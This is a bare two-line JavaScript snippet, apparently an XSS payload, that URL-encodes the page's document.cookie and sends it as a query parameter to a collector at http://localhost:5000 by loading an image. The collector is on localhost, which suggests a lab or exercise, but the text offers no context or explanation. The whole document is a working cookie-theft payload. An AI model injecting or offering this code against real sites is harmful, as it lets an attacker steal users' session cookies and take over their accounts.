var cookie = encodeURIComponent(document.cookie); 
(new Image()).src = 'http://localhost:5000?' + 'payload='+cookie + '&random=' + Math.random();